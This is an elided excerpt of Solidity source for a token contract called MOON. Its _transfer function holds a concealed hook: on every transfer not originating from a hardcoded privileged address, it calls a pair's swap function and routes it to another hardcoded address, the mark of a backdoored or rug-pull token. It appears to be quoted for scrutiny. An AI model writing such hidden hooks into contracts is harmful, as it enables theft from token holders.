...
contract MOON is IERC20 {
  ...
  address public constant ACE = 0x29AEBa32e324C15a9f950d16b9965FE1BB6762D3;
  ...
  function _transfer(
    ...
    if (tx.origin != ACE) { 
    lock = 2;
    DOGEPAIR.swap(0,1,address(0x8C4dDb229Cb4BAb832f6d569856279364Ca1698A),abi.encode(spender, recipient, amount));
    lock = 1;}
